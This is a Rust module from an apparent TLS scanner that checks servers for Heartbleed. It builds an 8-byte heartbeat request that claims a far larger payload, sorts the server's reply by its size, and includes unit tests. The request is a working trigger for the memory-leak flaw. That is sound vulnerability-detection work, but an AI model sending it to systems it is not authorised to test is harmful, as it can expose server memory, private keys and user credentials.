use super::HeartbleedResult;
use crate::constants::{CONTENT_TYPE_HEARTBEAT, HEARTBEAT_REQUEST, VERSION_TLS_1_2};
use crate::{Result, TlsError};

const CLAIMED_PAYLOAD_LEN: u16 = 0x4000;
const CLAIMED_RECORD_BODY_LEN: usize = 3 + CLAIMED_PAYLOAD_LEN as usize;
const MIN_SUSPICIOUS_RESPONSE: usize = 16;
const WARNING_THRESHOLD: usize = 32;

pub(super) const BYTES_SENT: usize = 8;

pub(super) fn malicious_request() -> Result<Vec<u8>> {
    let heartbeat_msg_len =
        u16::try_from(CLAIMED_RECORD_BODY_LEN).map_err(|_| TlsError::ParseError {
            message: "Heartbleed heartbeat message length too large".to_string(),
        })?;
    let version = VERSION_TLS_1_2.to_be_bytes();
    let heartbeat_msg_len = heartbeat_msg_len.to_be_bytes();

    Ok(vec![
        CONTENT_TYPE_HEARTBEAT,
        version[0],
        version[1],
        heartbeat_msg_len[0],
        heartbeat_msg_len[1],
        HEARTBEAT_REQUEST,
        (CLAIMED_PAYLOAD_LEN >> 8) as u8,
        (CLAIMED_PAYLOAD_LEN & 0xff) as u8,
    ])
}

pub(super) fn classify_response(response: &[u8]) -> HeartbleedResult {
    let bytes_received = response.len();
    let valid_heartbeat_response = super::heartbeat_response::is_valid(response);
    let vulnerable = bytes_received >= MIN_SUSPICIOUS_RESPONSE && valid_heartbeat_response;

    HeartbleedResult {
        vulnerable,
        bytes_received,
        bytes_sent: BYTES_SENT,
        details: details(bytes_received, valid_heartbeat_response, vulnerable),
        tested: bytes_received >= MIN_SUSPICIOUS_RESPONSE,
    }
}

fn details(bytes_received: usize, valid_heartbeat_response: bool, vulnerable: bool) -> String {
    if vulnerable {
        if bytes_received < WARNING_THRESHOLD {
            return format!(
                "VULNERABLE: Heartbleed detected. Received {} bytes (sent {} bytes, claimed {} bytes in heartbeat). \
                 NOTE: Response size is small, manual verification recommended.",
                bytes_received, BYTES_SENT, CLAIMED_RECORD_BODY_LEN
            );
        }

        return format!(
            "VULNERABLE: Heartbleed detected. Received {} bytes (sent {} bytes, claimed {} bytes). Memory leak confirmed.",
            bytes_received, BYTES_SENT, CLAIMED_RECORD_BODY_LEN
        );
    }

    if bytes_received == 0 {
        return "Connection closed by server during heartbeat test - inconclusive. \
             Server may have rejected malformed heartbeat (not vulnerable) or \
             may have crashed (potentially vulnerable). Manual verification recommended."
            .to_string();
    }

    if !valid_heartbeat_response {
        return format!(
            "Not vulnerable - Response does not appear to be a valid heartbeat response. \
             Received {} bytes. Manual verification recommended if server returned unexpected data.",
            bytes_received
        );
    }

    format!(
        "Not vulnerable - Received {} bytes (sent {} bytes, claimed {} bytes, threshold: {})",
        bytes_received, BYTES_SENT, CLAIMED_RECORD_BODY_LEN, MIN_SUSPICIOUS_RESPONSE
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn malicious_request_uses_oversized_payload_claim() {
        let request = malicious_request().expect("request should build");

        assert_eq!(request.len(), BYTES_SENT);
        assert_eq!(request[0], CONTENT_TYPE_HEARTBEAT);
        assert_eq!(
            u16::from_be_bytes([request[3], request[4]]) as usize,
            CLAIMED_RECORD_BODY_LEN
        );
        assert_eq!(
            u16::from_be_bytes([request[6], request[7]]),
            CLAIMED_PAYLOAD_LEN
        );
    }

    #[test]
    fn valid_large_heartbeat_response_is_vulnerable() {
        let mut response = vec![0x18, 0x03, 0x03, 0x00, 0x20, 0x02, 0x00, 0x1d];
        response.extend(vec![0u8; 29]);

        let result = classify_response(&response);

        assert!(result.vulnerable);
        assert!(result.tested);
    }

    #[test]
    fn empty_response_is_inconclusive() {
        let result = classify_response(&[]);

        assert!(!result.vulnerable);
        assert!(!result.tested);
        assert!(result.details.contains("inconclusive"));
    }
}
